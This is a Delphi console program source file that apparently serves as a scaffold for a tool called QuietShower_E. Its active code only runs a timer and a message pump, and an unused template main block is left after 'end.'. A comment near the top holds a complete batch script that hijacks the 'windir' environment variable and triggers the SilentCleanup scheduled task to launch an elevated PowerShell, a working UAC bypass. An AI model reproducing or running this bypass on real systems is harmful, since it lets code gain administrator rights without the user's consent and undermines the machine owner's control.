program QuietShower_E;

{$APPTYPE CONSOLE}

{$R *.res}

{
echo "ShedTaskUAC.bat"
@echo off
timeout /t 3 >nul
reg add "HKCU\Environment" /v "windir" /d "cmd /c start powershell&REM " >nul
timeout /t 5 >nul
schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I >nul
timeout /t 3 >nul
reg delete "HKCU\Environment" /v "windir" /F
timeout /t 2 >nul

}



uses
  SysUtils,
  windows,
  extctrls,
  timer in 'timer.pas';

//message pumping loop saves using sleep(milliseconds)
//https://www.generacodice.com/en/articolo/4670217/using-vcl-ttimer-in-delphi-console-application
type
  TEventHandlers = class
    procedure OnTimerTick(Sender : TObject);
  end;

var
  Timer : TTimer;
  EventHandlers : TEventHandlers;


procedure TEventHandlers.OnTimerTick(Sender : TObject);
begin
  writeln('Hello from TimerTick event');
end;

procedure MsgPump;
var
  Unicode: Boolean;
  Msg: TMsg;

begin
  while GetMessage(Msg, 0, 0, 0) do begin
    Unicode := (Msg.hwnd = 0) or IsWindowUnicode(Msg.hwnd);
    TranslateMessage(Msg);
    if Unicode then
      DispatchMessageW(Msg)
    else
      DispatchMessageA(Msg);
  end;
end;

begin
  EventHandlers := TEventHandlers.Create();
  Timer := TTimer.Create(nil);
  Timer.Enabled := false;
  Timer.Interval := 1000;
  Timer.OnTimer := EventHandlers.OnTimerTick;
  Timer.Enabled := true;
  MsgPump;
end.


begin
  try
    { TODO -oUser -cConsole Main : Insert code here }
    //start timeout of 5 seconds


  except
    on E: Exception do
      Writeln(E.ClassName, ': ', E.Message);
  end;
end.
